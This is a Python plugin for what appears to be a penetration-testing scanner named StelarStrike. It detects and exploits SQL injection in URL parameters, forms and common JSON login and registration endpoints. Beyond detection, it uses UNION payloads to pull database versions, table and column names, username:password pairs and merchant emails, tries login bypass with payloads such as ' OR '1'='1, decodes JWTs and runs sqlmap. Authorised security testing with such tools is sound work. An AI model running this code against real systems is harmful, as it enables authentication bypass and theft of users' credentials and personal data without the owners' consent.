"""
SQL Injection plugin — Big Pickle methodology (full exploitation).

Phases:
  1. Recon: Enumerate endpoints, forms, parameters
  2. Detection: Error-based, boolean-blind, time-blind, UNION-based
  3. Exploitation: Extract DB version, tables, columns, credentials
  4. sqlmap: Run automated verification and data dump

Tested databases: MySQL, PostgreSQL, MSSQL, SQLite, Oracle
"""

from __future__ import annotations

import asyncio
import json
import tempfile
import time
from pathlib import Path
from typing import Any

from stelarstrike.core.report import Finding
from stelarstrike.plugins.base import VulnerabilityPlugin
from stelarstrike.utils.http_client import build_url_with_params, extract_forms, get_query_params
from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

# Database error signatures
_ERROR_SIGNATURES: dict[str, list[str]] = {
    "mysql": [
        "You have an error in your SQL syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "Warning: mysql",
        "valid MySQL result",
        "MySqlClient.",
        "com.mysql.jdbc",
    ],
    "postgresql": [
        "PostgreSQL",
        "pg_query",
        "pg_exec",
        "valid PostgreSQL result",
        "Npgsql.",
        "PG::SyntaxError",
        "org.postgresql",
        "each UNION query must have the same number of columns",
        "UNION types text and integer cannot be matched",
        "invalid input syntax for type",
        "relation .* does not exist",
        "syntax error at or near",
    ],
    "mssql": [
        "Driver.*SQL[-_ ]Server",
        "OLE DB.*SQL Server",
        "\\bSQL Server[^&lt;&quot;]+Driver",
        "Warning.*mssql_",
        "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        "System\\.Data\\.SqlClient\\.SqlException",
        "Unclosed quotation mark after the character string",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLite\\.Exception",
        "System\\.Data\\.SQLite\\.SQLiteException",
        "Warning.*sqlite_",
        "Warning.*SQLite3::",
        "\\[SQLITE_ERROR\\]",
        "SQLite error",
    ],
    "oracle": [
        "\\bORA-[0-9][0-9][0-9][0-9]",
        "Oracle error",
        "Oracle.*Driver",
        "Warning.*oci_",
        "Warning.*ora_",
    ],
}

# Time-based blind payloads per DBMS
_TIME_PAYLOADS: dict[str, dict[str, Any]] = {
    "mysql": {"payload": "' AND SLEEP(5)--", "marker": "SLEEP"},
    "postgresql": {"payload": "' AND pg_sleep(5)--", "marker": "pg_sleep"},
    "mssql": {"payload": "'; WAITFOR DELAY '0:0:5'--", "marker": "WAITFOR"},
    "oracle": {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "marker": "DBMS_PIPE"},
}

# Boolean-based payloads
_BOOLEAN_TRUE = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]
_BOOLEAN_FALSE = ["' AND '1'='2", "' AND 1=2--", "' AND 'a'='b"]


class SQLiPlugin(VulnerabilityPlugin):
    id = "sqli"
    name = "SQL Injection"
    default_severity = "critical"

    def __init__(self, ctx):
        super().__init__(ctx)
        self._extracted_data: dict[str, Any] = {}
        self._detected_dbms: str | None = None
        self._col_count: int = 0

    async def run(self) -> list[Finding]:
        findings: list[Finding] = []
        techniques = self.options.get("techniques", ["error-based", "boolean-blind", "time-blind"])
        time_delay = self.options.get("time_delay_seconds", 5)

        # Phase 1: Enumerate parameters from query string
        query_params = get_query_params(self.target_url)
        for param in query_params:
            result = await self._test_parameter(param, query_params, techniques, time_delay)
            if result:
                findings.append(result)

        # Phase 2: Enumerate forms and test their fields
        try:
            resp = await self.get(self.target_url)
            forms = extract_forms(resp.text)
            for form in forms:
                form_findings = await self._test_form(form, techniques, time_delay)
                findings.extend(form_findings)
        except Exception as exc:
            log.debug(f"sqli: could not fetch forms from {self.target_url}: {exc}")

        # Phase 3: Test common JSON API endpoints
        json_findings = await self._test_json_endpoints(techniques, time_delay)
        findings.extend(json_findings)

        # Phase 4: Run sqlmap ONCE on first confirmed vuln endpoint (fast verification)
        if findings and self.ctx.allow_active_payloads:
            sqlmap_finding = await self._run_sqlmap(findings)
            if sqlmap_finding:
                findings.append(sqlmap_finding)

        return findings

    async def _test_parameter(
        self,
        param: str,
        params: dict[str, str],
        techniques: list[str],
        time_delay: int,
    ) -> Finding | None:
        base_value = params.get(param, "1")

        # Get baseline response
        baseline_url = build_url_with_params(self.target_url, params)
        try:
            baseline = await self.get(baseline_url)
            baseline_body = baseline.text
            baseline_len = len(baseline_body)
        except Exception:
            return None

        # Error-based detection
        if "error-based" in techniques:
            error_finding = await self._test_error_based(param, params, baseline_body)
            if error_finding:
                return error_finding

        # Boolean-blind detection
        if "boolean-blind" in techniques:
            bool_finding = await self._test_boolean(param, params, baseline_body, baseline_len)
            if bool_finding:
                return bool_finding

        # Time-blind detection
        if "time-blind" in techniques and self.ctx.allow_active_payloads:
            time_finding = await self._test_time(param, params, time_delay)
            if time_finding:
                return time_finding

        # UNION-based detection and exploitation
        if self.ctx.allow_active_payloads:
            union_finding = await self._test_union(param, params)
            if union_finding:
                return union_finding

        return None

    async def _test_error_based(
        self, param: str, params: dict[str, str], baseline_body: str
    ) -> Finding | None:
        payload = "'"
        test_params = dict(params)
        test_params[param] = payload
        url = build_url_with_params(self.target_url, test_params)

        try:
            resp = await self.get(url)
        except Exception:
            return None

        body = resp.text
        if body == baseline_body:
            return None

        # Check for SQL error signatures
        for dbms, signatures in _ERROR_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in body.lower():
                    self._detected_dbms = dbms
                    return self._create_finding(
                        title=f"SQL Injection (error-based, {dbms})",
                        url=url,
                        parameter=param,
                        injection_type="error-based",
                        dbms=dbms,
                        evidence=self._format_evidence(
                            technique="Error-based",
                            payload=payload,
                            response=body,
                            signature=sig,
                        ),
                        description=(
                            f"Parameter '{param}' is vulnerable to error-based SQL injection.\n"
                            f"The database appears to be {dbms}.\n"
                            f"Error signature: {sig}"
                        ),
                        severity="critical",
                        confidence="high",
                    )

        # Check if response changed (potential boolean-based)
        if len(body) != len(baseline_body):
            return self._create_finding(
                title="Possible SQL Injection (response difference)",
                url=url,
                parameter=param,
                injection_type="boolean-detect",
                evidence=self._format_evidence(
                    technique="Response diff",
                    payload=payload,
                    baseline_length=len(baseline_body),
                    response_length=len(body),
                ),
                description="Response length changed after injecting single quote. Manual verification recommended.",
                severity="medium",
                confidence="low",
            )

        return None

    async def _test_boolean(
        self, param: str, params: dict[str, str], baseline_body: str, baseline_len: int
    ) -> Finding | None:
        for true_payload, false_payload in zip(_BOOLEAN_TRUE, _BOOLEAN_FALSE):
            # Test TRUE condition
            true_params = dict(params)
            true_params[param] = true_payload
            true_url = build_url_with_params(self.target_url, true_params)

            # Test FALSE condition
            false_params = dict(params)
            false_params[param] = false_payload
            false_url = build_url_with_params(self.target_url, false_params)

            try:
                true_resp = await self.get(true_url)
                false_resp = await self.get(false_url)
            except Exception:
                continue

            # TRUE should match baseline, FALSE should differ
            true_matches = abs(len(true_resp.text) - baseline_len) < 100
            false_differs = abs(len(false_resp.text) - baseline_len) > 100

            if true_matches and false_differs:
                return self._create_finding(
                    title="SQL Injection (boolean-based blind)",
                    url=true_url,
                    parameter=param,
                    injection_type="boolean-blind",
                    evidence=self._format_evidence(
                        technique="Boolean-based blind",
                        true_payload=true_payload,
                        false_payload=false_payload,
                        baseline_length=baseline_len,
                        true_length=len(true_resp.text),
                        false_length=len(false_resp.text),
                    ),
                    description=(
                        f"Parameter '{param}' is vulnerable to boolean-based blind SQL injection.\n"
                        f"Response differs predictably between TRUE and FALSE conditions."
                    ),
                    severity="critical",
                    confidence="high",
                )

        return None

    async def _test_time(
        self, param: str, params: dict[str, str], time_delay: int
    ) -> Finding | None:
        for dbms, info in _TIME_PAYLOADS.items():
            payload = info["payload"]
            test_params = dict(params)
            test_params[param] = payload
            url = build_url_with_params(self.target_url, test_params)

            # Get baseline timing
            baseline_start = time.monotonic()
            try:
                await self.get(build_url_with_params(self.target_url, params))
            except Exception:
                continue
            baseline_time = time.monotonic() - baseline_start

            # Test with time payload
            start = time.monotonic()
            try:
                resp = await self.get(url)
            except Exception:
                continue
            elapsed = time.monotonic() - start

            # If response took significantly longer, likely vulnerable
            if elapsed >= time_delay and elapsed > baseline_time + 3:
                return self._create_finding(
                    title=f"SQL Injection (time-based blind, {dbms})",
                    url=url,
                    parameter=param,
                    injection_type="time-blind",
                    dbms=dbms,
                    evidence=self._format_evidence(
                        technique="Time-based blind",
                        payload=payload,
                        baseline_time=f"{baseline_time:.2f}s",
                        payload_time=f"{elapsed:.2f}s",
                        expected_delay=f"{time_delay}s",
                    ),
                    description=(
                        f"Parameter '{param}' is vulnerable to time-based blind SQL injection.\n"
                        f"Database appears to be {dbms}."
                    ),
                    severity="critical",
                    confidence="high",
                )

        return None

    async def _test_union(self, param: str, params: dict[str, str]) -> Finding | None:
        # Phase 1: Find column count
        col_count = await self._find_column_count(param, params)
        if col_count < 1:
            return None

        self._col_count = col_count

        # Phase 2: Determine column types
        col_types = await self._determine_column_types(param, params, col_count)

        # Phase 3: Extract data
        extracted = await self._extract_data(param, params, col_count, col_types)

        # Phase 4: Try authentication bypass
        auth_bypass = await self._test_auth_bypass_get(param, params)

        evidence = self._format_evidence(
            technique="UNION-based",
            column_count=col_count,
            column_types=col_types,
            extracted_data=extracted,
            auth_bypass=auth_bypass,
        )

        return self._create_finding(
            title=f"SQL Injection (UNION-based, {col_count} columns)",
            url=build_url_with_params(self.target_url, params),
            parameter=param,
            injection_type="union",
            evidence=evidence,
            description=(
                f"Parameter '{param}' is vulnerable to UNION-based SQL injection.\n"
                f"The table has {col_count} columns.\n"
                f"Column types: {col_types}\n"
                f"Extracted data: {json.dumps(extracted, indent=2) if extracted else 'None'}"
            ),
            severity="critical",
            confidence="confirmed",
            extracted_data=extracted,
        )

    async def _find_column_count(self, param: str, params: dict[str, str]) -> int:
        """Find the number of columns using ORDER BY and UNION SELECT."""
        # Try ORDER BY first
        for i in range(1, 20):
            order_payload = f"' ORDER BY {i}--"
            test_params = dict(params)
            test_params[param] = order_payload
            url = build_url_with_params(self.target_url, test_params)

            try:
                resp = await self.get(url)
            except Exception:
                break

            body_lower = resp.text.lower()
            if "error" in body_lower or "syntax" in body_lower or len(resp.text) == 0:
                return i - 1

        # Try UNION SELECT with increasing NULLs
        for i in range(1, 20):
            nulls = ",".join(["null"] * i)
            union_payload = f"' UNION SELECT {nulls}--"
            test_params = dict(params)
            test_params[param] = union_payload
            url = build_url_with_params(self.target_url, test_params)

            try:
                resp = await self.get(url)
            except Exception:
                continue

            body_lower = resp.text.lower()
            # Check if it worked (no column count error)
            if "each union query must have the same number of columns" not in body_lower:
                if "union types" not in body_lower:
                    return i

        return 0

    async def _determine_column_types(
        self, param: str, params: dict[str, str], col_count: int
    ) -> dict[int, str]:
        """Determine which columns are integer vs text."""
        col_types: dict[int, str] = {}

        for col in range(1, col_count + 1):
            # Build SELECT with integer at position $col, null elsewhere
            values = []
            for i in range(1, col_count + 1):
                if i == 1:
                    values.append("1")
                elif i == col:
                    values.append("42")
                else:
                    values.append("null")

            sel = ",".join(values)
            test_params = dict(params)
            test_params[param] = f"' UNION SELECT {sel}--"
            url = build_url_with_params(self.target_url, test_params)

            try:
                resp = await self.get(url)
                if "token" in resp.text or "success" in resp.text.lower():
                    col_types[col] = "integer"
                else:
                    col_types[col] = "text"
            except Exception:
                col_types[col] = "unknown"

        return col_types

    async def _extract_data(
        self, param: str, params: dict[str, str], col_count: int, col_types: dict[int, str]
    ) -> dict[str, Any]:
        """Extract database information via UNION injection."""
        extracted: dict[str, Any] = {}

        # Find which column reflects data (usually column 2)
        reflect_col = 2  # Default, will try to find the right one

        # Extract DB version
        version = await self._extract_via_column(
            param, params, col_count, reflect_col,
            "version()",
        )
        if version:
            extracted["db_version"] = version

        # Extract table names
        tables = await self._extract_via_column(
            param, params, col_count, reflect_col,
            "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
        )
        if tables:
            extracted["tables"] = tables.split(",")

        # Extract column names for users table
        if tables and "users" in tables:
            columns = await self._extract_via_column(
                param, params, col_count, reflect_col,
                "(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')",
            )
            if columns:
                extracted["users_columns"] = columns.split(",")

        # Extract sample user data
        users = await self._extract_via_column(
            param, params, col_count, reflect_col,
            "(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)",
        )
        if users:
            extracted["sample_users"] = users.split(",")

        return extracted

    async def _extract_via_column(
        self, param: str, params: dict[str, str], col_count: int, reflect_col: int, subquery: str
    ) -> str | None:
        """Extract data via a specific column using subquery."""
        values = []
        for i in range(1, col_count + 1):
            if i == 1:
                values.append("1")
            elif i == reflect_col:
                values.append(subquery)
            else:
                values.append("null")

        sel = ",".join(values)
        test_params = dict(params)
        test_params[param] = f"' UNION SELECT {sel}--"
        url = build_url_with_params(self.target_url, test_params)

        try:
            resp = await self.get(url)
            data = resp.json()
            # Try to get the reflected value from debug_info or response
            debug_info = data.get("debug_info", {})
            if isinstance(debug_info, dict):
                return debug_info.get("username") or debug_info.get("user_id")
            return None
        except Exception:
            return None

    async def _test_auth_bypass_get(self, param: str, params: dict[str, str]) -> dict[str, Any] | None:
        """Test authentication bypass via SQLi (GET parameters)."""
        bypass_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
        ]

        for payload in bypass_payloads:
            test_params = dict(params)
            test_params[param] = payload
            url = build_url_with_params(self.target_url, test_params)

            try:
                resp = await self.get(url)
                data = resp.json()
                if data.get("status") == "success" or data.get("token"):
                    return {
                        "payload": payload,
                        "user_id": data.get("debug_info", {}).get("user_id"),
                        "username": data.get("debug_info", {}).get("username"),
                        "token": data.get("token"),
                    }
            except Exception:
                continue

        return None

    async def _test_auth_bypass_post(self, url: str, field: str) -> dict[str, Any] | None:
        """Test authentication bypass via SQLi (POST JSON)."""
        bypass_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
        ]

        for payload in bypass_payloads:
            data = {"password": "test123"}
            data[field] = payload

            try:
                resp = await self.post(url, json=data)
                result = resp.json()
                if result.get("status") == "success" or result.get("token"):
                    return {
                        "payload": payload,
                        "user_id": result.get("debug_info", {}).get("user_id"),
                        "username": result.get("debug_info", {}).get("username"),
                        "token": result.get("token"),
                    }
            except Exception:
                continue

        return None

    async def _test_union_post(self, url: str, field: str) -> Finding | None:
        """Test UNION-based SQLi on POST JSON endpoint with data extraction."""
        # Phase 1: Find column count
        col_count = await self._find_column_count_post(url, field)
        if col_count < 1:
            return None

        # Phase 2: Determine column types
        col_types = await self._determine_column_types_post(url, field, col_count)

        # Phase 3: Extract data
        extracted = await self._extract_data_post(url, field, col_count, col_types)

        # Build evidence
        evidence = self._format_evidence(
            technique="UNION-based (POST JSON)",
            endpoint=url,
            field=field,
            column_count=col_count,
            column_types=col_types,
            extracted_data=extracted,
        )

        return self._create_finding(
            title=f"SQL Injection (UNION-based, {col_count} columns) - {url}",
            url=url,
            parameter=field,
            injection_type="union",
            evidence=evidence,
            description=(
                f"Parameter '{field}' at {url} is vulnerable to UNION-based SQL injection.\n"
                f"The table has {col_count} columns.\n"
                f"Column types: {col_types}\n"
                f"Database info extracted successfully."
            ),
            severity="critical",
            confidence="confirmed",
            extracted_data=extracted,
        )

    async def _find_column_count_post(self, url: str, field: str) -> int:
        """Find column count for POST JSON endpoint."""
        # Try UNION SELECT with increasing NULLs
        for i in range(1, 20):
            nulls = ",".join(["null"] * i)
            payload = f"' UNION SELECT {nulls}--"
            data = {"password": "test123", field: payload}

            try:
                resp = await self.post(url, json=data)
                body = resp.text.lower()
                # Check if it worked
                if "each union query must have the same number of columns" not in body:
                    if "union types" not in body:
                        if "syntax error" not in body:
                            return i
            except Exception:
                continue

        return 0

    async def _determine_column_types_post(
        self, url: str, field: str, col_count: int
    ) -> dict[int, str]:
        """Determine column types for POST JSON endpoint."""
        col_types: dict[int, str] = {}

        for col in range(1, col_count + 1):
            # Build SELECT with integer at position 1, integer at col, null elsewhere
            values = []
            for i in range(1, col_count + 1):
                if i == 1:
                    values.append("1")
                elif i == col:
                    values.append("42")
                else:
                    values.append("null")

            sel = ",".join(values)
            payload = f"' UNION SELECT {sel}--"
            data = {"password": "test123", field: payload}

            try:
                resp = await self.post(url, json=data)
                result = resp.json()
                # If success or token exists, column accepts integer
                if result.get("status") == "success" or result.get("token"):
                    col_types[col] = "integer"
                else:
                    col_types[col] = "text"
            except Exception:
                col_types[col] = "unknown"

        return col_types

    async def _extract_data_post(
        self, url: str, field: str, col_count: int, col_types: dict[int, str]
    ) -> dict[str, Any]:
        """Extract database information via UNION injection on POST JSON endpoint."""
        extracted: dict[str, Any] = {}

        # Find which column reflects data (try column 2 first - usually username)
        reflect_col = 2

        # Extract DB version
        version = await self._extract_via_column_post(url, field, col_count, reflect_col, "version()")
        if version:
            extracted["db_version"] = version

        # Extract table names (PostgreSQL)
        tables = await self._extract_via_column_post(
            url, field, col_count, reflect_col,
            "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')"
        )
        if tables:
            extracted["tables"] = tables.split(",")

        # Extract column names for users table
        if tables and "users" in tables:
            columns = await self._extract_via_column_post(
                url, field, col_count, reflect_col,
                "(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')"
            )
            if columns:
                extracted["users_columns"] = columns.split(",")

        # Extract sample user data (username:password)
        users = await self._extract_via_column_post(
            url, field, col_count, reflect_col,
            "(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)"
        )
        if users:
            extracted["sample_users"] = users.split(",")

        # Extract merchants if they exist
        if tables and "merchants" in tables:
            merchants = await self._extract_via_column_post(
                url, field, col_count, reflect_col,
                "(SELECT string_agg(name||':'||email,',' ) FROM merchants LIMIT 5)"
            )
            if merchants:
                extracted["sample_merchants"] = merchants.split(",")

        return extracted

    async def _extract_via_column_post(
        self, url: str, field: str, col_count: int, reflect_col: int, subquery: str
    ) -> str | None:
        """Extract data via a specific column using subquery on POST JSON endpoint."""
        values = []
        for i in range(1, col_count + 1):
            if i == 1:
                values.append("1")
            elif i == reflect_col:
                values.append(subquery)
            else:
                values.append("null")

        sel = ",".join(values)
        payload = f"' UNION SELECT {sel}--"
        data = {"password": "test123", field: payload}

        try:
            resp = await self.post(url, json=data)
            result = resp.json()

            # Try to get the reflected value from debug_info or response
            debug_info = result.get("debug_info", {})
            if isinstance(debug_info, dict):
                # The subquery result is usually in the username field
                value = debug_info.get("username")
                if value and value != payload:
                    return str(value)

            # Try direct response fields
            if "token" in result:
                # Decode JWT to get username
                token = result.get("token", "")
                if token:
                    try:
                        import base64
                        parts = token.split(".")
                        if len(parts) >= 2:
                            payload_data = parts[1]
                            # Add padding
                            padding = 4 - len(payload_data) % 4
                            if padding != 4:
                                payload_data += "=" * padding
                            decoded = base64.urlsafe_b64decode(payload_data)
                            data = json.loads(decoded)
                            return data.get("username")
                    except Exception:
                        pass

            return None
        except Exception:
            return None

    async def _test_form(
        self, form: dict[str, Any], techniques: list[str], time_delay: int
    ) -> list[Finding]:
        findings: list[Finding] = []
        action = form["action"] or self.target_url
        action_url = action if action.startswith("http") else self.target_url

        for input_field in form["inputs"]:
            if input_field["type"] in ("submit", "button", "hidden"):
                continue

            field_name = input_field["name"]
            data = {i["name"]: i.get("value", "test") for i in form["inputs"]}

            # Test error-based
            if "error-based" in techniques:
                data[field_name] = "'"
                try:
                    if form["method"] == "post":
                        resp = await self.post(action_url, data=data)
                    else:
                        resp = await self.get(build_url_with_params(action_url, data))

                    for dbms, signatures in _ERROR_SIGNATURES.items():
                        for sig in signatures:
                            if sig.lower() in resp.text.lower():
                                findings.append(self._create_finding(
                                    title=f"SQL Injection in form (error-based, {dbms})",
                                    url=action_url,
                                    parameter=field_name,
                                    injection_type="error-based",
                                    dbms=dbms,
                                    evidence=self._format_evidence(
                                        technique="Error-based (form)",
                                        form_field=field_name,
                                        payload="'",
                                        signature=sig,
                                        response=resp.text[:500],
                                    ),
                                    description=f"Form field '{field_name}' is vulnerable to error-based SQL injection.",
                                    severity="critical",
                                    confidence="high",
                                ))
                                break
                except Exception:
                    pass

        return findings

    async def _test_json_endpoints(
        self, techniques: list[str], time_delay: int
    ) -> list[Finding]:
        """Test common JSON API endpoints (POST with JSON body)."""
        findings: list[Finding] = []

        # Common JSON API endpoints to test
        json_endpoints = [
            {"path": "/login", "method": "POST", "fields": ["username"]},
            {"path": "/register", "method": "POST", "fields": ["username"]},
            {"path": "/api/login", "method": "POST", "fields": ["username"]},
            {"path": "/api/register", "method": "POST", "fields": ["username"]},
            {"path": "/api/v3/forgot-password", "method": "POST", "fields": ["username"]},
            {"path": "/api/v1/merchants/login", "method": "POST", "fields": ["email"]},
            {"path": "/api/v1/merchants/register", "method": "POST", "fields": ["name", "email"]},
        ]

        # Get base URL
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in json_endpoints:
            url = base_url + endpoint["path"]

            # Check if endpoint exists
            try:
                resp = await self.get(url)
                if resp.status_code == 404:
                    continue
            except Exception:
                continue

            # Test each field
            for field in endpoint["fields"]:
                field_vulnerable = False

                if "error-based" in techniques:
                    finding = await self._test_json_error_based(url, field)
                    if finding:
                        findings.append(finding)
                        field_vulnerable = True

                if "boolean-blind" in techniques and self.ctx.allow_active_payloads:
                    finding = await self._test_json_boolean(url, field)
                    if finding:
                        findings.append(finding)
                        field_vulnerable = True

                # Test auth bypass
                if self.ctx.allow_active_payloads:
                    auth_bypass = await self._test_auth_bypass_post(url, field)
                    if auth_bypass:
                        findings.append(self._create_finding(
                            title=f"SQL Injection - Authentication Bypass ({url})",
                            url=url,
                            parameter=field,
                            injection_type="auth-bypass",
                            evidence=self._format_evidence(
                                technique="Authentication bypass",
                                endpoint=url,
                                field=field,
                                payload=auth_bypass["payload"],
                                user_id=auth_bypass.get("user_id"),
                                username=auth_bypass.get("username"),
                                token=auth_bypass.get("token"),
                            ),
                            description=f"Authentication bypass achieved on {url} via SQL injection.",
                            severity="critical",
                            confidence="confirmed",
                        ))
                        field_vulnerable = True

                # Test UNION-based with data extraction ONLY if field is vulnerable
                if field_vulnerable and self.ctx.allow_active_payloads:
                    union_finding = await self._test_union_post(url, field)
                    if union_finding:
                        findings.append(union_finding)

        return findings

    async def _test_json_error_based(self, url: str, field: str) -> Finding | None:
        """Test JSON endpoint for error-based SQLi."""
        payload = {"password": "test123"}
        payload[field] = "'"

        try:
            resp = await self.post(url, json=payload)
            body = resp.text

            for dbms, signatures in _ERROR_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in body.lower():
                        return self._create_finding(
                            title=f"SQL Injection in JSON API (error-based, {dbms})",
                            url=url,
                            parameter=field,
                            injection_type="error-based",
                            dbms=dbms,
                            evidence=self._format_evidence(
                                technique="Error-based (JSON)",
                                endpoint=url,
                                field=field,
                                payload="'",
                                signature=sig,
                                response=body[:500],
                            ),
                            description=f"JSON field '{field}' at {url} is vulnerable to error-based SQL injection.",
                            severity="critical",
                            confidence="high",
                        )
        except Exception:
            pass

        return None

    async def _test_json_boolean(self, url: str, field: str) -> Finding | None:
        """Test JSON endpoint for boolean-based SQLi."""
        # Get baseline
        baseline_payload = {"password": "test123", field: "test"}
        try:
            baseline_resp = await self.post(url, json=baseline_payload)
            baseline_len = len(baseline_resp.text)
        except Exception:
            return None

        # Test TRUE condition
        true_payload = {"password": "test123", field: "' OR '1'='1"}
        try:
            true_resp = await self.post(url, json=true_payload)
        except Exception:
            return None

        # Test FALSE condition
        false_payload = {"password": "test123", field: "' AND '1'='2"}
        try:
            false_resp = await self.post(url, json=false_payload)
        except Exception:
            return None

        # Check if TRUE matches baseline and FALSE differs
        true_matches = abs(len(true_resp.text) - baseline_len) < 100
        false_differs = abs(len(false_resp.text) - baseline_len) > 100

        if true_matches and false_differs:
            return self._create_finding(
                title="SQL Injection in JSON API (boolean-based blind)",
                url=url,
                parameter=field,
                injection_type="boolean-blind",
                evidence=self._format_evidence(
                    technique="Boolean-based blind (JSON)",
                    endpoint=url,
                    field=field,
                    true_payload="' OR '1'='1",
                    false_payload="' AND '1'='2",
                    baseline_length=baseline_len,
                    true_length=len(true_resp.text),
                    false_length=len(false_resp.text),
                ),
                description=f"JSON field '{field}' at {url} is vulnerable to boolean-based blind SQL injection.",
                severity="critical",
                confidence="high",
            )

        return None

    async def _run_sqlmap(self, findings: list[Finding]) -> Finding | None:
        """Run sqlmap ONCE for verification on the first confirmed vulnerable endpoint."""
        if not self.ctx.allow_active_payloads:
            return None

        # Find first error-based or boolean finding (most reliable for sqlmap)
        target_finding = None
        for f in findings:
            if "error-based" in f.title:
                target_finding = f
                break
        if not target_finding:
            for f in findings:
                if "boolean" in f.title:
                    target_finding = f
                    break
        if not target_finding:
            return None

        with tempfile.TemporaryDirectory() as tmpdir:
            request_file = self._create_sqlmap_request(target_finding, tmpdir)
            if request_file:
                return await self._execute_sqlmap(request_file, target_finding)
        return None

    def _create_sqlmap_request(self, finding: Finding, tmpdir: str) -> str | None:
        """Create a request file for sqlmap with * marker on the vulnerable param."""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(finding.url)
            host = parsed.hostname
            port = parsed.port or 80
            path = parsed.path
            param = finding.parameter or "username"

            # Build request
            request = f"POST {path} HTTP/1.1\r\n"
            request += f"Host: {host}:{port}\r\n"
            request += "Content-Type: application/json\r\n"
            request += "User-Agent: StelarStrike/0.1\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"

            # Add payload body with * on vulnerable param
            if param == "email":
                body = '{"email":"test@test.com*","password":"test"}'
            elif param == "username":
                body = '{"username":"test*","password":"test"}'
            else:
                body = f'{{"{param}":"test*"}}'

            request += body + "\n"

            # Write to file
            request_file = Path(tmpdir) / "request.txt"
            request_file.write_text(request)
            return str(request_file)

        except Exception as exc:
            log.debug(f"sqlmap: could not create request file: {exc}")
            return None

    async def _execute_sqlmap(self, request_file: str, finding: Finding) -> Finding | None:
        """Execute sqlmap on a request file (fast mode, single run)."""
        try:
            cmd = [
                "sqlmap",
                "-r", request_file,
                "-p", finding.parameter or "username",
                "--batch",
                "--dbms=PostgreSQL",
                "--level=2",
                "--risk=1",
                "--threads=4",
                "--ignore-code=401",
                "--output-dir=/tmp/sqlmap_output",
            ]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=120,  # 2 min max
            )

            output = stdout.decode() + stderr.decode()

            if "injectable" in output.lower() or "payload:" in output.lower():
                # Extract just the payloads section
                payload_section = ""
                for line in output.splitlines():
                    if "payload:" in line.lower() or "type:" in line.lower():
                        payload_section += line.strip() + "\n"

                return self._create_finding(
                    title=f"SQL Injection (sqlmap confirmed) - {finding.parameter}",
                    url=finding.url,
                    parameter=finding.parameter,
                    injection_type="sqlmap-confirmed",
                    evidence=self._format_evidence(
                        technique="sqlmap verification",
                        sqlmap_output=payload_section.strip() or output[-1500:],
                        original_finding=finding.title,
                    ),
                    description=f"sqlmap confirmed SQL injection on parameter '{finding.parameter}'.",
                    severity="critical",
                    confidence="confirmed",
                )

        except asyncio.TimeoutError:
            log.warning(f"sqlmap: timeout on {finding.parameter}")
        except FileNotFoundError:
            log.warning("sqlmap: not installed, skipping")
        except Exception as exc:
            log.debug(f"sqlmap: error: {exc}")

        return None

    def _create_finding(
        self,
        title: str,
        url: str,
        parameter: str | None,
        injection_type: str,
        evidence: str,
        description: str,
        severity: str,
        confidence: str,
        dbms: str | None = None,
        extracted_data: dict | None = None,
    ) -> Finding:
        """Create a finding with the standard evidence format."""
        return Finding(
            plugin=self.id,
            title=title,
            severity=severity,
            url=url,
            parameter=parameter,
            evidence=evidence,
            description=description,
            remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
            confidence=confidence,
            cwe="CWE-89",
            extracted_data=extracted_data,
        )

    def _format_evidence(self, **kwargs) -> str:
        """Format evidence in the standard Big Pickle format."""
        lines = []
        for key, value in kwargs.items():
            if isinstance(value, dict):
                lines.append(f"{key}:")
                for k, v in value.items():
                    lines.append(f"  {k}: {v}")
            elif isinstance(value, list):
                lines.append(f"{key}: {', '.join(str(v) for v in value)}")
            else:
                lines.append(f"{key}: {value}")
        return "\n".join(lines)
